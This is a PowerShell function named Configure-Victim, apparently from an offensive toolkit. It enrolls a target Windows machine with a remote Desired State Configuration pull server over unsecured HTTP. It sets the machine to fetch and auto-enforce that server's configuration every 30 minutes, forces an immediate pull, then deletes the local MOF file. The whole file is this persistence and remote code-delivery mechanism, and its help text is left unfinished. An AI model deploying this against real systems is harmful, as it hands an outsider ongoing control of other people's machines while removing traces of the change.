function Configure-Victim
{
<#
.SYNOPSIS

Registers victim host with DSC pull server

.DESCRIPTION

Registers victim machine with DSC server, downloads and applies specified configuration (GUID), and defines the local configuration manager (LCM)

.PARAMETER Guid

GUID to be used to pull the correct configuration (GUID is generated previously, server side, when the configuration is created). 

.PARAMETER DSCServer

Metwork address of the remote DSC server

.PARAMETER MofPath

Optional parameter of the temporary MOF file location. If  parameter is not supplied the file is written to C:\Windows\System32\Configuration\PullConfig.mof then deleted.


.EXAMPLE

WRITE EXAMPLES


#>


    [CmdletBinding()] Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(36, 36)]
        [String] $GUID,

        [Parameter(Mandatory = $True)]
        [String] $Server,

        [Parameter(Mandatory = $False)]
        [ValidatePattern('\.mof$')]
        [String] $MofPath = "C:\Windows\System32\Configuration\PullConfig.mof"



    )


    Configuration ConfigurePullServer
    {
        param ($NodeId, $PullServer)    
 
        LocalConfigurationManager
        {
            AllowModuleOverwrite = $True
            ConfigurationID = $NodeId
            # Minutes between target policy being implemented
            ConfigurationModeFrequencyMins = 15 
            ConfigurationMode = 'ApplyAndAutoCorrect'
            # Minutes between pull server requests
            RefreshFrequencyMins = 30
            RebootNodeIfNeeded = $False
            RefreshMode = 'Pull'
            DownloadManagerName = 'WebDownloadManager'
            DownloadManagerCustomData = (@{ServerUrl = "http://${PullServer}:8080/psdscpullserver.svc"; 
                                            AllowUnsecureConnection = “TRUE”})
         
        }
    }
 
    Write-Host "Generating pull server configuration"
 
    ConfigurePullServer -NodeId $GUID -PullServer $Server -OutputPath $MOFPath 

    Write-Host "Applying pull server settings"

    Set-DscLocalConfigurationManager -path $MofPath -Verbose

    # Force DSC to implement config 
    Invoke-CimMethod -Namespace root/Microsoft/Windows/DesiredStateConfiguration -Cl MSFT_DSCLocalConfigurationManager -Method PerformRequiredConfigurationChecks -Arguments @{Flags = [System.UInt32]1}

    #Delete MOF file and directory
    Write-Host "Deleting MOF file"

    Remove-Item -Path $MofPath -Force -Recurse
}